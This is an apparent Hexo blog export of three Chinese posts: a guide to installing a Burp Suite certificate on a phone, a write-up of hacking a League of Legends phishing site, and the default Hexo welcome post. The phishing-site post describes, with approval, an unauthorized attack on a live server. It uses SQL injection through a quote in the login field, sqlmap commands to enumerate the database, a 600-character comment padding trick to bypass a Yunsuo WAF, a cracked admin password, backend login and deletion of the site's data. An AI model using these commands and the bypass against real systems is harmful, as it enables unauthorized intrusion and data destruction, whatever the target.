<h2 id="手机安装CA证书"><a href="#手机安装CA证书" class="headerlink" title="手机安装CA证书"></a>手机安装CA证书</h2><p>打开手机浏览器输入 <a href="http://burp/" target="_blank" rel="noopener">http://burp/</a></p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-19.png" class="" title="This is an image-19 image">
<p>点击 CA Certificate 下载证书<br>在手机中打开文件管理器 在 0/Download下</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-20.png" class="" title="This is an image-20 image">
<p>更改证书后缀名</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-23.png" class="" title="This is an image-23 image">

<p>安装证书</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-25.png" class="" title="This is an image-25 image">
<h2 id="尝试抓包"><a href="#尝试抓包" class="headerlink" title="尝试抓包"></a>尝试抓包</h2><p>打开burp抓包拦截功能</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-26.png" class="" title="This is an image-26 image">
<p>在手机浏览器输入网址</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-27.png" class="" title="This is an image-27 image">
<p>抓包成功</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>burp suite</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透LOL钓鱼网站</title>
    <url>/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h1 id="渗透LOL钓鱼网站"><a href="#渗透LOL钓鱼网站" class="headerlink" title="渗透LOL钓鱼网站"></a>渗透LOL钓鱼网站</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间收到一封邮件<br>emmmm 是一个钓鱼网站</p>
<a id="more"></a>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/1.jpg" class="" title="This is an 1 image">
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/2.png" class="" title="This is an 2 image">
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/3.jpg" class="" title="This is an 3 image">

<h2 id="日他"><a href="#日他" class="headerlink" title="日他"></a>日他</h2><p>然后我去百度了一下 看到了  <a href="https://www.secpulse.com/archives/116392.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116392.html</a><br>爆破后台  <a href="http://www.xxx.com.cn/history/login.php" target="_blank" rel="noopener">http://www.xxx.com.cn/history/login.php</a><br>既然人家都做了信息收集我就不做了<br>输入账号密码  账号admin’ 密码 123456</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/4.png" class="" title="This is an 4 image">
<p>报错，把地址也爆出来了</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/5.png" class="" title="This is an 5 image">
<p>那么，直接用sqlmap跑一下<br>用burp抓包  抓包后 在admin后面加个“*”</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6.png" class="" title="This is an 6 image">
<p>然后，sqlmap 跑注入<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/8.png" class="" title="This is an 8 image">
<p>sqlmap中查库<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<h3 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/9.png" class="" title="This is an 9 image">
<p>有云锁  想办法bypass<br>发现只要select 查什么的时候 就会拦截</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/10.png" class="" title="This is an 10 image">
<p>去网上看了好多 都失败  当看到最后一个的时候 在 <code>/**/</code>中添加600个字符的时候可以绕过我试了一下</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/11.png" class="" title="This is an 11 image">
<p>绕过了   那么直接在lol.txt内加入     <code>/*(里面有600个字符)*/</code>  （由于我不会写tamper）</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/13.png" class="" title="This is an 13 image">
<p>(把sqlmap中缓存删除一下)</p>
<h3 id="sqlmap中查库"><a href="#sqlmap中查库" class="headerlink" title="sqlmap中查库"></a>sqlmap中查库</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6666.png" class="" title="This is an 6666 image">
<p>成功绕过</p>
<h3 id="sqlmap查表"><a href="#sqlmap查表" class="headerlink" title="sqlmap查表"></a>sqlmap查表</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx --tables</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/16.png" class="" title="This is an 16 image">
<h3 id="sqlmap查列"><a href="#sqlmap查列" class="headerlink" title="sqlmap查列"></a>sqlmap查列</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx -T xxx --columns</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/18.png" class="" title="This is an 18 image">
<h3 id="sqlmap查数据"><a href="#sqlmap查数据" class="headerlink" title="sqlmap查数据"></a>sqlmap查数据</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/19.png" class="" title="This is an 19 image">
<p>密码MD5解密后 Aaxxxxxxxx</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/20.png" class="" title="This is an 20 image">
<p>后台没有什么太多的功能无法getshell 但是数据很多<br>数据库权限是usage<br>最后删除数据</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
        <tag>SQL注入</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
